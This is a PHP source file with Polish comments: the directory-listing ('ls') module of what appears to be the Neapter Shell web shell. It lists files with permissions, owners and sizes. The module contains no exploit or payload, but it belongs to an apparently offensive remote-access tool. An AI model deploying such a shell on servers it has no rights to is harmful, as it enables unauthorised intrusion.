<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * ModuleLs - Listowanie plikow / katalogow
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */
class ModuleLs implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Czy funkcja posix_getpwuid istnieje
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bFuncOwnerById = FALSE;

	/**
	 * Czy funkcja posix_getgrgid istnieje
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bFuncGroupById = FALSE;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;

		/**
		 * Czy funkcje sa dostepne
		 */
		$this -> bFuncOwnerById = function_exists( 'posix_getpwuid' );
		$this -> bFuncGroupById = function_exists( 'posix_getgrgid' );
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'ls' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.03 2012-11-11 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Wyświetlanie informacji o plikach i katalogach

	Użycie:
		ls ścieżka_do_katalogu

	Opcje:
		-l wyświetlanie szczegółowych informacji o plikach i katalogach
		   właściciel, grupa, rozmiar, czas utworzenia

		-R wyświetlanie plików i katalogów rekurencyjnie

	Przykład:
		ls /home/
		ls -l /home/
		ls -lR /home/
DATA;
	}

	/**
	 * Pobieranie nazwy uzytkownika po jego ID
	 *
	 * @access private
	 * @param  integer        $iValue ID uzytkownika
	 * @return string|integer         Nazwa uzytkownika / ID uzytkownika
	 */
	private function getOwnerById( $iValue )
	{
		if( $this -> bFuncOwnerById )
		{
			$aUser = posix_getpwuid( $iValue );
			return $aUser['name'];
		}

		return $iValue;
	}

	/**
	 * Pobieranie nazwy grupy po jej ID
	 *
	 * @access private
	 * @param  integer        $iValue ID grupy
	 * @return string|integer         Nazwa grupy / ID grupy
	 */
	private function getGroupById( $iValue )
	{
		if( $this -> bFuncGroupById )
		{
			$aGroup = posix_getgrgid( $iValue );
			return $aGroup['name'];
		}

		return $iValue;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		$sOutput = NULL;

		/**
		 * Domyslny katalog jezeli nie podano sciezki
		 */
		$sDir = ( ! empty( $this -> oShell -> aArgv ) ? $this -> oShell -> sArgv : getcwd() );

		$bList      = in_array( 'l', $this -> oShell -> aOptv );
		$bRecursive = in_array( 'R', $this -> oShell -> aOptv );

		try
		{
			/**
			 * Jezeli chcemy wyswietlic pliki i katalogi rekurencyjnie to uzywamy
			 * obiektu RecursiveDirectoryIterator
			 */
			if( $bRecursive )
			{
				$oDirectory = new RecursiveIteratorIterator( new XRecursiveDirectoryIterator( $sDir ), RecursiveIteratorIterator::SELF_FIRST | FilesystemIterator::FOLLOW_SYMLINKS );
			}
			else
			{
				$oDirectory = new DirectoryIterator( $sDir );
			}

			/**
			 * Informacja o komendzie jaka wykonalismy
			 */
			$sOutput .= sprintf( "%s\r\n\r\n", $sDir );

			$sFileName = ( $bRecursive ? 'getPathname' : 'getBasename' );

			foreach( $oDirectory as $oFile )
			{
				if( $bList )
				{
					/**
					 * Windows ?
					 */
					if( $this -> oShell -> bWindows )
					{
						/**
						 * Wyjatek - nie mamy praw odczytu dla wlasciwosci pliku
						 */
						try
						{
							$sType = ( ( $oFile -> getType() === 'file' ) ? '-' : 'd' );
							$sSize = $oFile -> getSize();
							$sDate = date( 'Y-m-d h:i', $oFile -> getCTime() );
						}
						catch( Exception $oException )
						{
							$sType = '?';
							$sSize = '-1';
							$sDate = '0000-00-00 00:00';
						}

						$sOutput .= sprintf( "%s %11d %s %s\r\n",
							$sType,
							$sSize,
							$sDate,
							$oFile -> {$sFileName}()
						);
					}
					else
					{
						/**
						 * Wyjatek - nie mamy praw odczytu dla wlasciwosci pliku
						 */
						try
						{
							$sType = ( ( $oFile -> getType() === 'file' ) ? '-' : 'd' );
							$sSize = $oFile -> getSize();
							$sDate = date( 'Y-m-d h:i', $oFile -> getCTime() );
							$iPerms = $oFile -> getPerms();
							$iOwner = $oFile -> getOwner();
							$iGroup = $oFile -> getGroup();
						}
						catch( Exception $oException )
						{
							$sSize = '-1';
							$sType = '?';
							$sDate = '0000-00-00 00:00';
							$iPerms = 16384;
							$iOwner = -1;
							$iGroup = -1;
						}

						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\r\n",
							$sType,
							substr( sprintf( '%o', $iPerms ), -4 ),
							$this -> getOwnerById( $iOwner ),
							$this -> getGroupById( $iGroup ),
							$sSize,
							$sDate,
							$oFile -> {$sFileName}()
						);
					}
				}
				else
				{
					/**
					 * Wyjatek - nie mamy praw odczytu dla wlasciwosci pliku
					 */
					try
					{
						$sType = ( ( $oFile -> getType() === 'file' ) ? 'fil' : 'dir' );
					}
					catch( Exception $oException )
					{
						$sType = '---';
					}

					$sOutput .= sprintf( "%s %s\r\n", $sType, $oFile -> {$sFileName}() );
				}
			}

			return htmlspecialchars( $sOutput );
		}
		catch( Exception $oException )
		{
			return sprintf( "Nie można otworzyć katalogu \"%s\"\r\n\r\nErro: %s", $sDir, $oException -> getMessage()  );
		}
	}

}